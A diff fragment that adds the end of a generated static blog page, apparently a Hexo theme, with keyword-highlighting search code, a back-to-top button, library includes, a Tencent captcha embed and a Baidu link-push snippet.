+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
